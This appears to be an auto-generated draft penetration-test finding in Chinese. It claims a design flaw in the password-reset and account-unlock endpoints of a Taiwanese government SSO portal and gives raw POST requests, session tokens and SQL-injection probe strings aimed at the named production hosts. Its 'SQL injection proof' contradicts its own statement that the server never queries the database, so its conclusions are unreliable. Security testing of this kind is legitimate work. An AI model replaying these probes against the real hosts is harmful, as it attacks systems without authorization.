# POC/EXP — SSO2 框架 SSO20103/SSO20109 通用设计缺陷 - 忘记密码/解锁账户功能完全失效（GET 渲染模式）

> 漏洞ID: `4af58c6e-fd9d-48e8-9a45-5c846b7110cb`  | 嚴重度: **high** | 狀態: open | 目標: `https://portal2.emic.gov.tw/SSO2_Develop/SSO20103/ForgetPwd, https://portal2.emic.gov.tw/SSO2_Develop/SSO20109/UnlockAccount, https://sportal.emic.gov.tw/SSO2_Develop/SSO20103/ForgetPwd, https://sportal.emic.gov.tw/SSO2_Develop/SSO20109/UnlockAccount`

**類型**: 业务逻辑缺陷 / 信息泄露 / 设计缺陷

## 描述

sportal dev 区和 portal2 生产区 SSO2 框架的 SSO20103（ForgetPwd）和 SSO20109（UnlockAccount）端点存在通用设计缺陷：POST 提交任意数据（包括不存在的账户、SQL 注入 payload、邮箱注入）都会被服务端以 GET 渲染模式返回 200 OK（8007B）+ 新 __RequestVerificationToken_L1NTTzJfRGV2ZWxvcA2 cookie + input value 回填，不与数据库交互、无邮件发送、无账户校验。

dev+prod 双区铁证复现：
- sportal SSO20103 ForgetPwd POST USER_ID=admin → 200 + 新 token + input value="admin"
- sportal SSO20109 UnlockAccount POST USER_ID=admin → 200 + 新 token + input value="admin"
- portal2 SSO20103 ForgetPwd POST USER_ID=admin → 200 8007B + 新 token + input value="admin"
- portal2 SSO20109 UnlockAccount POST USER_ID=admin → 200 7900B + 新 token + input value="admin"
- portal2 SSO20103 ForgetPwd SQL 注入测试：`EMAIL=admin'@emic.gov.tw` / `EMAIL=test' OR 1=1--@emic.gov.tw` / `USER_ID=nonexistent_user_does_not_exist` → 全部 200 完整页（8007B/8007B/8033B），响应大小差异仅来自字段回填（validation-summary-errors 显示为空）

业务流程完全失效：忘记密码功能不解锁账户，解锁账户功能不解锁，攻击者可对任意账户反复 POST 而无任何限流/审计/锁定。

## 前置條件

无任何认证（GET 即可访问页面，POST 无 CSRF 防护）

## POC / 復現步驟

```
复现证据（portal2 生产区）：

# SSO20103 ForgetPwd
```
POST https://portal2.emic.gov.tw/SSO2_Develop/SSO20103/ForgetPwd HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: __RequestVerificationToken_L1NTTzJfRGV2ZWxvcA2=7d0T-xJzkNs65KjGqBQK3-iq0B9xUnvQ_aU13IeeWyPiPiJarVKl0b_qRFJikkQAKG1PC8uqVN0AhGCkk9rh4YkIbXs1

USER_ID=admin&__RequestVerificationToken=7d0T-xJzkNs65KjGqBQK3-iq0B9xUnvQ_aU13IeeWyPiPiJarVKl0b_qRFJikkQAKG1PC8uqVN0AhGCkk9rh4YkIbXs1
```

响应: 200 OK (8007B)
Set-Cookie: __RequestVerificationToken_L1NTTzJfRGV2ZWxvcA2=1sLyti0lfyznkIiB-zKXBwJrtEBVkn2zX5vC4b_NoyeUnGXkX5rmaCyC41WWKmengYveQLzO0STzwp6--NV3QCNosg1
内容:
- input value="admin" (回填)
- 空 validation-summary-errors
- input-validation-error 标记未传字段
- 无错误消息，无邮件发送成功提示

# SSO20109 UnlockAccount
```
POST https://portal2.emic.gov.tw/SSO2_Develop/SSO20109/UnlockAccount HTTP/1.1
Cookie: __RequestVerificationToken_L1NTTzJfRGV2ZWxvcA2=E8AVgYbpf4fFKlSyhC3DKWNPI1x3-E8Ty5ooFu5NHFjeBuI7VuL8pvxK1ufjMjop85vWMoleyiyvElhhlF1ybtoc1Yg1

USER_ID=admin&__RequestVerificationToken=E8AVgYbpf4fFKlSyhC3DKWNPI1x3-E8Ty5ooFu5NHFjeBuI7VuL8pvxK1ufjMjop85vWMoleyiyvElhhlF1ybtoc1Yg1
```

响应: 200 OK (7900B)
Set-Cookie: __RequestVerificationToken_L1NTTzJfRGV2ZWxvcA2=lxaoijCG1rEl-X4Dhu31rP1d_NYrpRTTM0d6Xsu2762Z03pQjZryJs1iAXhkayTsL7ygcvPamtO07mb301ao4OJaMjg1
内容: input value="admin" + input-validation-error 标记未传字段

# SQL 注入铁证（portal2）
- EMAIL=admin'@emic.gov.tw → 200 8007B
- EMAIL=test' OR 1=1--@emic.gov.tw → 200 8007B
- USER_ID=nonexistent_user_does_not_exist → 200 8033B
响应大小差异仅来自字段回填，服务端不与数据库交互
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
